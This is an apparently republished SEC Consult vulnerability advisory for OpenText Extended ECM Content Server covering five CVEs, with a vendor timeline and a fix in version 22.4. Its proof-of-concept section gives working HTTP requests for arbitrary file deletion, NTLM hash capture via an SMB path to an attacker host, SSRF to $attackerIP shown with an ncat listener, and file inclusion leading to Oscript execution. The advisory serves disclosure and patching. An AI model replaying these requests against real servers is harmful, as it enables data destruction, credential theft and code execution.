@@ -1,0 +1,404 @@
+id: 38166
+date: 01/22/2023
+title: OpenText Extended ECM 22.3 File Deletion / LFI / Privilege Escsalation Vulnerabilities
+author: Armin Stock
+cves: CVE-2022-45922, CVE-2022-45924, CVE-2022-45925, CVE-2022-45926, CVE-2022-45928
+
+=======================================================================
+               title: Multiple post-authentication vulnerabilities including RCE
+             product: OpenText™ Content Server component of OpenText™ Extended ECM
+  vulnerable version: 16.2.2 - 22.3
+       fixed version: 22.4
+          CVE number: CVE-2022-45924, CVE-2022-45922, CVE-2022-45925,
+                      CVE-2022-45926, CVE-2022-45928
+              impact: High
+            homepage: https://www.opentext.com/
+               found: 2022-09-16
+                  by: Armin Stock (Atos)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Atos company
+                      Europe | Asia | North America
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"OpenText™ Extended ECM is an enterprise CMS platform that securely governs the
+information lifecycle by integrating with leading enterprise applications, such
+as SAP®, Microsoft® 365, Salesforce and SAP SuccessFactors®. Bringing content
+and processes together, Extended ECM provides access to information when and
+where it’s needed, improves decision-making and drives operational effectiveness."
+
+Source: https://www.opentext.com/products/extended-ecm
+
+
+Business recommendation:
+------------------------
+The vendor provides a patch which should be installed immediately.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Deletion of arbitrary files (CVE-2022-45924)
+The endpoint `itemtemplate.createtemplate2` allows a low privilege user to
+delete arbitrary files on the server's local filesystem.
+
+2) Privilege escalation due to logic error in cookie creation  (CVE-2022-45922)
+The request handler for a user accessible function sets a valid AdminPwd cookie
+that allows access to unauthorized endpoints without knowing the password.
+
+3) xmlExport multiple vulnerabilities (CVE-2022-45925)
+3.1) Information disclosure
+The action `xmlexport` accepts the parameter `requestContext`. If this
+parameter is present, the response does include most of the `HTTP` headers sent
+to the server and some of the `CGI` variables like `remote_addr` and
+`server_name`.
+
+3.2) Capture of NTLM hashes
+The action `xmlexport` accepts the parameter `transform` in combination
+with `stylesheet`. The `stylesheet` parameter can be a `nodeID` or a filepath.
+If a filepath is specified, the `ContentServer` tries to open the file. As
+absolute paths are allowed it is possible to provide a network share to force
+the `ContentServer` to open a connection to the network share. This allows an
+attacker to capture the `NTLM Hash` of the user running the `ContentServer`.
+
+4) Evaluate webreports via notify.localizeEmailTemplate (CVE-2022-45926)
+The endpoint `notify.localizeEmailTemplate` does allow a low privilege user to
+evaluate webreports. This can be used to perform a `Server Side Request Forgery
+(SSRF)` attack, with nearly full control of the actual request.
+
+5) Local File Inclusion allows Oscript execution (CVE-2022-45928)
+Multiple endpoints allow the user to pass the parameter `htmlFile`, which is
+included in the `HTML` output rendering pipeline of the request. As the
+`Content Server` evaluates and executes `Oscript` code in `HTML` files, it is
+possible for an attacker to execute `Oscript` code. The `Oscript` scripting
+language allows the attacker for example to manipulate files on the filesystem,
+create new network connections or execute OS system commands.
+
+
+Proof of concept:
+-----------------
+1) Deletion of arbitrary files (CVE-2022-45924)
+As a first step the user has to create a new `Customer View Template` object via
+`/cs.exe?func=ll&objAction=create&objtype=844&nextURL=foo` to get a valid
+`cacheID`. With the acquired `cacheID` the following request can be used to
+delete a file. The parameter `DefinitionFile` controls which file should be
+deleted.
+
+-------------------------------------------------------------------------------
+http://opentext-dev/OTCS/cs.exe?func=itemtemplate.createtemplate2&objType=844&parentId=2000&cacheID=730440157&DefinitionFile=C:/temp/poc-del.txt
+-------------------------------------------------------------------------------
+
+
+2) Privilege escalation due to logic error in cookie creation (CVE-2022-45922)
+Sending the following request returns a new valid `AdminPwd` cookie.
+
+-------------------------------------------------------------------------------
+[ PoC removed, will be published at a later date ]
+-------------------------------------------------------------------------------
+
+Response:
+-------------------------------------------------------------------------------
+HTTP/1.1 200 OK
+Cache-Control: no-cache
+Pragma: no-cache
+Content-Type: application/json; charset=UTF-8
+Server: Microsoft-IIS/10.0
+Set-Cookie: 
+LLCookie=7X%2BfmttVXssmR2fGiuA4%2BeDFI4%2FotYL4o%2BkpxBTZUWrlHqwvH%2BIg3BCPhuBhD%2B567K288n7PJNeZQkk75EmxtndEpU3chq3cFppnAQ7OAYMX%2Bvl09QntFKi9E%2BWekSdNU866093uXCT4IqYR1ofVfkoLKFwTiUf%2BhgrVKaB8aoLOLlBU5RIrNA%3D%3D; 
+path=/OTCS/; httponly
+Set-Cookie: 
+AdminPwd=oq6SNA9Db6yUl0vP1ucJkLuRhIYbvO3YdIujUbLLdzGMsygouzJlyuhDLTriq4C1XrMHxWYWkCeuxoZevX0%2BYyFMEevzZVXI6Fe82YBI3HnKu2Stq50vZ8bhPPQeBbXiW%2FRwgp8RHukHgnEWUq3axpUP5OHWCJj9V3Pj5%2FNNqJKie0gUv055KavSIj80Id4dXDiHVu%2FI6IXMhEb1Tm4EVLE1rjxMnpmZILTKds%2FkabH%2FanPx5Jl3YL%2BBkX0PiPe54guaWQj2ReTr1SW7Beomoriq2FrW%2BWK91OtMy%2BbrVTfgEZSRdRNIkA%3D%3D; 
+path=/OTCS/; httponly
+X-Powered-By: ASP.NET
+Date: Sat, 01 Oct 2022 17:57:54 GMT
+Connection: close
+Content-Length: 221
+
+{"errMsg":"","ok":true,"sessionInactivity":1620000,"sessionLogoutURL":"?func=ll.DoLogout&secureRequestToken=STWVlmadtchZfgpCevUaWz%2FG%2BaDWVMAmJIByhcw6J3FRBkfQdUEyakxuWBKKZIfkujPUOp2jURQ%3D","sessionReactionTime":180000}
+-------------------------------------------------------------------------------
+
+
+3) xmlExport multiple vulnerabilities (CVE-2022-45925)
+3.1) Information disclosure
+Sending the following request reveals sensitive information about the
+request:
+
+-------------------------------------------------------------------------------
+GET /OTCS//cs.exe?func=ll&objAction=xmlexport&requestContext=T&objId=2004 HTTP/1.1
+Host: opentext-dev
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.8,de-DE;q=0.5,de;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: LLCookie=Ztn...
+Upgrade-Insecure-Requests: 1
+-------------------------------------------------------------------------------
+
+Response:
+-------------------------------------------------------------------------------
+HTTP/1.1 200 OK
+Content-Type: application/xml
+Server: Microsoft-IIS/10.0
+X-Powered-By: ASP.NET
+Date: Sat, 01 Oct 2022 16:13:40 GMT
+Connection: close
+Content-Length: 12581
+
+<?xml version="1.0" encoding="UTF-8"?>
+<livelink Acls='false' appversion='16.2.0' AttributeInfo='false' CallbackHandlerName='{''}' ContentInline='false' DoingImport='false' ExtUserInfo='false' FollowAliases='false' ForImport='false' 
+HandlerName='XmlExport' NodeInfo='false' Permissions='false' Schema='false' Scope='one' src='XmlExport'>
+   <context>
+     <user deleted='0' groupid='999' groupname='[Content Server Administration]' groupownerid='1000' grouptype='11' id='1000' name='Admin' ownerid='1000' spaceid='0' type='0' userprivileges='16777215'/>
+     <cgi auth_type='' content_length='0' content_type='' path_info='' query_string='func=ll&objAction=xmlexport&requestContext=T&objId=2004' remote_addr='$IP' remote_host='$IP' remote_user='' 
+request_method='GET' script_name='/OTCS/cs.exe' server_name='opentext-dev' server_port='80' server_protocol='HTTP/1.1'/>
+     <http>
+       <header name='HTTP_ACCEPT' value='text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'/>
+       <header name='HTTP_ACCEPT_ENCODING' value='gzip, deflate'/>
+       <header name='HTTP_ACCEPT_LANGUAGE' value='en-US,en;q=0.8,de-DE;q=0.5,de;q=0.3'/>
+       <header name='HTTP_CONNECTION' value='close'/>
+       <header name='HTTP_HOST' value='opentext-dev'/>
+       <header name='HTTP_UPGRADE_INSECURE_REQUESTS' value='1'/>
+       <header name='HTTP_USER_AGENT' value='Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'/>
+     </http>
+   </context>
+-------------------------------------------------------------------------------
+
+3.2) Capture of NTLM hashes
+Sending the following request with a remote path as value for the
+`stylesheet` parameter initiates a SMB connection to the attacker's machine:
+
+-------------------------------------------------------------------------------
+GET /OTCS//cs.exe?func=ll&&objId=50469&objAction=xmlexport&transform=T&stylesheet=//$attackerIP/msg.txt
+-------------------------------------------------------------------------------
+
+-------------------------------------------------------------------------------
+$ sudo impacket-smbserver test /tmp -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection ($opentextIP,59639)
+[*] AUTHENTICATE_MESSAGE (\,DESKTOP-XXX)
+[*] User DESKTOP-XXX\ authenticated successfully
+[*] :::00::aaaaaaaaaaaaaaaa
+
+-------------------------------------------------------------------------------
+
+Important side effect:
+
+Specifying an existing file for the `stylesheet` parameter , which is not a
+valid stylesheet, results in an error. As this error skips the cleanup code the
+temporary file `$OTCS_HOME\temp\xml\XslOutput_[digit]_[digit]` is not removed.
+The content of this file is partially controlled by the attacker, as it
+contains the filename of the exported object. This could be further exploited
+as documented in vulnerability 5).
+
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+
+
+     **OBJECT NAME**
+-------------------------------------------------------------------------------
+
+
+4) Evaluate webreports via notify.localizeEmailTemplate (CVE-2022-45926)
+Sending the following request with the webreport source in the `msgBody`
+parameter allows the user to evaluate a webreport.
+
+-------------------------------------------------------------------------------
+POST /OTCS/cs.exe HTTP/1.1
+Host: opentext-dev
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Connection: close
+Cookie: LLCookie=zBH4...
+Origin: http://opentext-dev
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 134
+
+func=notify.localizeEmailTemplate&language=_en_US&arg=5&msgBody=<@urlencode>Username: [LL_REPTAG_USERNAME /]<@/urlencode>&fetch=foobar
+-------------------------------------------------------------------------------
+
+Response:
+-------------------------------------------------------------------------------
+HTTP/1.1 200 OK
+Cache-Control: no-cache
+Pragma: no-cache
+Content-Type: text/plain ;charset=UTF-8
+Server: Microsoft-IIS/10.0
+X-Powered-By: ASP.NET
+Date: Sat, 01 Oct 2022 18:33:29 GMT
+Connection: close
+Content-Length: 19
+
+Username: Admin
+-------------------------------------------------------------------------------
+
+The tag `LL_WEBREPORT_RESTCLIENT` can be used to perform a
+`Server Side Request Forgery (SSRF)` attack, with nearly full control of the
+actual request.
+
+-------------------------------------------------------------------------------
+POST /OTCS/cs.exe HTTP/1.1
+Host: opentext-dev
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Connection: close
+Cookie: LLCookie=hRj
+Origin: http://opentext-dev
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 347
+
+func=notify.localizeEmailTemplate&language=_en_US&arg=5&msgBody=<@urlencode>  
+[LL_WEBREPORT_RESTCLIENT @URI:"http://$attackerIP/" @METHOD:GET @RESPONSE:resp @HOST:$attackerIP @PORT:80 /]
+<@/urlencode>&fetch=<@urlencode>LL_WEB [ /] [LL_REPTAG_EOL /] LL_WEB_END<@/urlencode>
+-------------------------------------------------------------------------------
+
+-------------------------------------------------------------------------------
+$ ncat -v -l 80
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from $IP.
+Ncat: Connection from $IP:59856.
+GET http://$attackerIP/ HTTP/1.1
+Connection: Keep-Alive
+Host: $attackerIP
+User-Agent: Poco
+Accept: */*
+
+-------------------------------------------------------------------------------
+
+Other dangerous tags could be `RUNSHELL`, `LL_FETCHURL` and `LL_WEBREPORT_CALL`
+
+The tag `LL_WEBREPORT_RESTCLIENT` is disabled by default in version 22.1.
+
+
+5) Local File Inclusion allows Oscript execution (CVE-2022-45928)
+One way to create a file on the server's filesystem with the desired `Oscript`
+code, is to use the vulnerability `3.2` and its side effect:
+
+* Create a file
+* Set the filename to the `Oscript` code, which should be executed (e.g.:
+   ``fArgs content: `.fArgs` ``)
+* Run the `xmlExport` action with an invalid `stylesheet` (should be done
+   multiple times to increase the hit change for the `LFI`)
+
+The temporary file `XslOutput_2_3` has the following content:
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+
+
+     fArgs content: `.fArgs`
+-------------------------------------------------------------------------------
+
+
+To include the previously created file and execute its `Oscript` code, the
+following request can be used.
+
+-------------------------------------------------------------------------------
+GET /OTCS/cs.exe?func=commdirectory.LookFeel&objid=49259&menutype=375&htmlFile=temp/xml/XslOutput_2_3 HTTP/1.1
+Host: opentext-dev
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.8,de-DE;q=0.5,de;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: 
+LLCookie=gYkU6%2BmrbXPaZ87US9mHOswpXTZTyMujb3DmwyB8QglNf9TnicUFBS2%2BW2xv2rufPoyGb82bn3VuyMwvDckJpuncAOHxuIeTbPce%2B6RSn035HjDkk5b2b0rZyM%2FzbtIquS3bYOetho6kt3RYhvkl2ahLkHvhGtO6KUp%2BMX%2Fe43yTpBcw5g1umg%3D%3D; 
+LLTZCookie=0; BrowseSettings=rm%2BT2O%2F0LEfyVN4tBpAlz8iw6wjD9YgjYihWC2sGyHOayyH0F8hfiQ%3D%3D; 
+AdminPwd=CV6waXr6yPLjlL2OlABJf4ka0kmITRSOHWyZSpzRdfy0SvueX0YM%2B6KFPopV5ebviGckgD6K24tGD7HXiJ18UhvZQBS%2BBYSlBI%2BzI0JCeGSH76MxvN%2BogDT59s6MIHVP4PAqqL1YzQ9cRN4L6eZbdE2hySDTwUQTQlOrSoxJNS28IQMclNUnsgct11cbQgApGWazgFlph4brLk65xEfi%2BN%2FGs9rSEKAehMwc94MvoFZ%2B5LLOurbgZYCLaA0YIWuHIUdppEsBVmQKjYGsjyS%2BNcEvcuuiCm8g6C%2FtRIUl85i%2BGyNeFi1rAA%3D%3D; 
+TargetBrowseObjID=0; TargetBrowseObjType=150; tl=public_timeline; Accordion=
+Upgrade-Insecure-Requests: 1
+-------------------------------------------------------------------------------
+
+Response:
+-------------------------------------------------------------------------------
+HTTP/1.1 200 OK
+Cache-Control: no-cache
+Content-Type: text/html;charset=UTF-8
+Server: Microsoft-IIS/10.0
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: frame-ancestors 'self'
+X-UA-Compatible: IE=edge
+Set-Cookie: 
+LLCookie=P7RTINkymKF2z1S8RQ6i0mjQKzaOb%2F2KNgFT5C2uBJZCgJ3sZ36Tll6LMvFDy3MC9DpjK00EXcIAROS7BHPtiMQTUqZ%2FVc6UtBXlW1%2FCljp1jDh1%2BUM05PJDhWzz1Xjzqnuw1iyIiCVDRBpgG9ztKGjSYngYLx6663COmbGleiMRgDlyufNcYw%3D%3D; 
+path=/OTCS/; httponly
+X-Powered-By: ASP.NET
+Date: Sun, 02 Oct 2022 10:37:09 GMT
+Connection: close
+Content-Length: 5762
+
+<!DOCTYPE html>
+<HTML LANG="en-US">
+<!-- ..... -->
+</HEAD>
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+
+
+fArgs content: 
+R<'_ExtendSessionTimeout'=true,'_REQUEST'='llweb','AUTH_TYPE'='','CONTENT_LENGTH'='0','CONTENT_TYPE'='','func'='commdirectory.LookFeel','GATEWAY_INTERFACE'='CGI/1.1','htmlFile'='temp/xml/XslOutput_2_3','HTTP_ACCEPT'='text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8','HTTP_ACCEPT_ENCODING'='gzip, 
+deflate','HTTP_ACCEPT_LANGUAGE'='en-US,en;q=0.8,de-DE;q=0.5,de;q=0.3','HTTP_CONNECTION'='close','HTTP_COOKIE'='LLTZCookie=0; 
+BrowseSettings=uUS1%2FZ5g1c0XS4%2FNRpsSf2m14UItUrVHPWaVbvGjfcio6cpCyC5KPA%3D%3D; 
+AdminPwd=6GxYwSEETjgXlHwOyzNue7sSkSKHieE2XNh7qe6h1MxuNNd3GlbD7NqlcaouTXLJvE84KXliXoS3rv0OEAoPMjLs%2B5navCaRtW32FuEYDhEtcTAetQzTUyEMJk8gtywZrslSilkjG%2FZjMh0S5nNi2MmkzquGi2BsKuKaN3dMGjscqQErAY9aIxAx1r%2FE7Gdsx1Vdo5SdILV2VdgVtjuMP3ul7RBYvHL1OsV4MtPjhB7s%2Flv6TXzrTUMzv3J%2BiVRxmXhxb%2BzFIAu7zE4DckTnGYE3tTP%2Fg1qL0GKrxVuBJbQIaZPyotwqSA%3D%3D; 
+TargetBrowseObjID=0; TargetBrowseObjType=150; 
+LLCookie=gYjACLksaCQXFyPM6bXgZFWxLST0MIVxqrqP9KwByUPbF8bVCKwyShPhoC0iRNqSytsqY1YfoW6i7DE39j7RpfjB4XnTw36lAps80xrs9nDkSqy1rDYqUsdbsHHJFSWCV5IzVVrS%2FuvrWBvv4e0HcYVpbbeXAI4%2BTWhmSWqDIvD68rCVqrrvRQ%3D%3D; 
+tl=public_timeline; Accordion=','HTTP_HOST'='opentext-dev','HTTP_UPGRADE_INSECURE_REQUESTS'='1','HTTP_USER_AGENT'='Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 
+Firefox/102.0','HTTPS'='off','HTTPS_KEYSIZE'='','HTTPS_SECRETKEYSIZE'='','HTTPS_SERVER_ISSUER'='','HTTPS_SERVER_SUBJECT'='','LLENVIRON_ASSOC'=A<1,?,'AUTH_TYPE'='','CONTENT_LENGTH'='0','CONTENT_TYPE'='','GATEWAY_INTERFACE'='CGI/1.1','HTTP_ACCEPT'='text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8','HTTP_ACCEPT_ENCODING'='gzip, 
+deflate','HTTP_ACCEPT_LANGUAGE'='en-US,en;q=0.8,de-DE;q=0.5,de;q=0.3','HTTP_CONNECTION'='close','HTTP_COOKIE'='LLTZCookie=0; 
+BrowseSettings=uUS1%2FZ5g1c0XS4%2FNRpsSf2m14UItUrVHPWaVbvGjfcio6cpCyC5KPA%3D%3D; 
+AdminPwd=6GxYwSEETjgXlHwOyzNue7sSkSKHieE2XNh7qe6h1MxuNNd3GlbD7NqlcaouTXLJvE84KXliXoS3rv0OEAoPMjLs%2B5navCaRtW32FuEYDhEtcTAetQzTUyEMJk8gtywZrslSilkjG%2FZjMh0S5nNi2MmkzquGi2BsKuKaN3dMGjscqQErAY9aIxAx1r%2FE7Gdsx1Vdo5SdILV2VdgVtjuMP3ul7RBYvHL1OsV4MtPjhB7s%2Flv6TXzrTUMzv3J%2BiVRxmXhxb%2BzFIAu7zE4DckTnGYE3tTP%2Fg1qL0GKrxVuBJbQIaZPyotwqSA%3D%3D; 
+TargetBrowseObjID=0; TargetBrowseObjType=150; 
+LLCookie=gYjACLksaCQXFyPM6bXgZFWxLST0MIVxqrqP9KwByUPbF8bVCKwyShPhoC0iRNqSytsqY1YfoW6i7DE39j7RpfjB4XnTw36lAps80xrs9nDkSqy1rDYqUsdbsHHJFSWCV5IzVVrS%2FuvrWBvv4e0HcYVpbbeXAI4%2BTWhmSWqDIvD68rCVqrrvRQ%3D%3D; 
+tl=public_timeline; Accordion=','HTTP_HOST'='opentext-dev','HTTP_UPGRADE_INSECURE_REQUESTS'='1','HTTP_USER_AGENT'='Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 
+Firefox/102.0','HTTPS'='off','HTTPS_KEYSIZE'='','HTTPS_SECRETKEYSIZE'='','HTTPS_SERVER_ISSUER'='','HTTPS_SERVER_SUBJECT'='','PATH_INFO'='','PATH_TRANSLATED'='C:\\inetpub\\wwwroot','QUERY_STRING'='func=commdirectory.LookFeel&objid=49259&menutype=375&htmlFile=temp/xml/XslOutput_2_3','REMOTE_ADDR'='$IP','REMOTE_HOST'='$IP','REMOTE_USER'='','REQUEST_METHOD'='GET','SCRIPT_NAME'='/OTCS/cs.exe','SERVER_NAME'='opentext-dev','SERVER_PORT'='80','SERVER_PROTOCOL'='HTTP/1.1','SERVER_SOFTWARE'='Microsoft-IIS/10.0'>,'LLPARAMS_LIST'=\{\{'func','commdirectory.LookFeel'},{'objid','49259'},{'menutype','375'},{'htmlFile','temp/xml/XslOutput_2_3'}},'LLSYSPARAMS_ASSOC'=A<1,?,'_uploadFilenames'={},'_uploadPath'='C:\\Windows\\TEMP\\'>,'menutype'=375,'objid'=49259,'PATH_INFO'='','PATH_TRANSLATED'='C:\\inetpub\\wwwroot','QUERY_STRING'='func=commdirectory.LookFeel&objid=49259&menutype=375&htmlFile=temp/xml/XslOutput_2_3','REMOTE_ADDR'='$IP','REMOTE_HOST'='$IP','REMOTE_USER'='','REQUEST_ID'='8f325fa0-7d39-42a7-bf8f-486cbcbf1042','REQUEST_METHOD'='GET','REQUEST_PROCESSING_DURATION'='0','SCRIPT_NAME'='/OTCS/cs.exe','SERVER_NAME'='opentext-dev','SERVER_PORT'='80','SERVER_PROTOCOL'='HTTP/1.1','SERVER_SOFTWARE'='Microsoft-IIS/10.0','cdid'=0,'prgCtx'=#323b0f9,'TZOffset'=0>
+
+</HTML>
+-------------------------------------------------------------------------------
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following version has been tested:
+* 22.1 (16.2.19.1803)
+
+The following versions are vulnerable according to the vendor:
+* CVE-2022-45924: 20.4   - 22.3
+* CVE-2022-45922: 21.1   - 22.1
+* CVE-2022-45925: 16.2.2 - 22.3
+* CVE-2022-45926: 20.4   - 22.3
+* CVE-2022-45928: 16.2.2 - 22.3
+
+
+Vendor contact timeline:
+------------------------
+2022-10-07: Vendor contacted via security@opentext.com
+2022-10-07: Vendor acknowledged the email and is reviewing the reports
+2022-11-18: Vendor confirms all vulnerabilities and is working on a patch aimed to
+             be released in November
+2022-11-24: Vendor delays the patch "few days/weeks into December"
+2022-11-25: Requesting CVE numbers (Mitre)
+2022-12-15: Vendor delays the patch and provides a release date: January 16th 2023
+2023-01-17: Public release of security advisory
+
+
+Solution:
+---------
+Upgrade to at least version 22.4 or apply hotfixes which can be downloaded at
+the vendor's page:
+https://support.opentext.com/csm?id=kb_article_view&sysparm_article=KB0781429
+
+#  0day.today [2023-03-27]  #
